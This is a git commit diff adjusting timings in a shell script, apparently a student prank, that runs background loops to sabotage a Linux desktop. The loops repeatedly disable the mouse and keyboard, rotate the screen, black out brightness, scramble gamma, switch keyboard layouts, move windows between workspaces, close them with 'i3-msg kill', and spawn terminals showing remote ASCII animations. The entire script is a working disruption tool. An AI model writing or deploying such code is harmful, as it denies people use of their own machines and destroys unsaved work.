4a608334cf6e3749e448caf88f3ec4d8eb177d88
Nathan HIRTH <nathan.hirth@epita.fr>
2024-12-10 17:42:31 +0100

    Change sleep time

--- WTF/loop.sh
+++ WTF/loop.sh
@@ -1,15 +1,16 @@
 #!/bin/sh
 while (true); do mouse=($(xinput | grep Mouse | cut -d = -f2 | cut -d [ -f1)); xinput disable $mouse; sleep 3; xinput enable $mouse; sleep 15; done &
-while (true); do for i in {0,2}; do xrandr -o $i && sleep 120; done && sleep 40; done &
-while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); for i in {0,1,2}; do xrandr --output $monitor --brightness 0; sleep 7; done && sleep 65; done &
+while (true); do for i in {0,2}; do xrandr -o $i && sleep 90; done && sleep 40; done &
+while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); for i in {0,1,2}; do xrandr --output $monitor --brightness 0; sleep 7; done && sleep 25; done &
 while (true); do i3-msg move container to workspace number $(( (RANDOM % 10) + 1 )); sleep 32; done &
-while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); xrandr --output $monitor --brightness 100; sleep 10; done &
-while (true); do for i in {1,2,3,4,6,5,7,10,9,8}; do i3-msg workspace number $i; alacritty -e curl ascii.live/rick & sleep 0.5; done && sleep 142; done &
-while (true); do alacritty -e "curl -L ascii.getfdn.com/epiquote; sleep 42000"; sleep 14; done &
-while (true); do i3-msg floating toggle; sleep 12; done &
-while (true); do feh https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/Yan.jpg; sleep 5; alacritty -e curl parrot.live; sleep 23; done &
-while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); R=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+1); print min+rand()*(max-min)}'); G=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+2); print min+rand()*(max-min)}'); B=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+3); print min+rand()*(max-min)}'); for i in {1..100}; do xrandr --output $monitor --gamma $R:$G:$B; sleep 0.1; done; sleep 0.1; done &
+while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); xrandr --output $monitor --brightness 100; sleep 5; done &
+while (true); do for i in {1,2,3,4,6,5,7,10,9,8}; do i3-msg workspace number $i; alacritty -e curl ascii.live/rick & sleep 0.5; done && sleep 64; done &
+while (true); do alacritty -e "curl -L ascii.getfdn.com/epiquote; sleep 42000"; sleep 10; done &
+while (true); do i3-msg floating toggle; sleep 21; done &
+while (true); do feh https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/Yan.jpg; sleep 5; alacritty -e curl parrot.live; sleep 13; done &
+while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); R=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+1); print min+rand()*(max-min)}'); G=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+2); print min+rand()*(max-min)}'); B=$(awk -v min=0.1 -v max=2 'BEGIN{srand(systime()+3); print min+rand()*(max-min)}'); for i in {1..100}; do xrandr --output $monitor --gamma $R:$G:$B; sleep 0.1; done; sleep 10; done &
 while (true); do i3-msg move workspace number $(( (RANDOM % 10) + 1 )); sleep 42; done &
-while (true); do setxkbmap fr; sleep 10; setxkbmap brai; sleep 10; setxkbmap gb; sleep 10; setxkbmap ru; sleep 10; setxkbmap us; sleep 10; done &
+while (true); do setxkbmap fr; sleep 10; setxkbmap brai; sleep 15; setxkbmap gb; sleep 10; setxkbmap ru; sleep 15; setxkbmap us; sleep 10; done &
 while (true); do i3-msg kill; sleep 28; done &
-while (true); do keyboard=($(xinput | grep Keyboard | cut -d = -f2 | cut -d [ -f1 | tail -n 1)); xinput disable $keyboard; sleep 3; xinput enable $keyboard; sleep 19; done &
+while (true); do keyboard=($(xinput | grep Keyboard | cut -d = -f2 | cut -d [ -f1 | tail -n 1)); xinput disable $keyboard; sleep 5; xinput enable $keyboard; sleep 19; done &
+
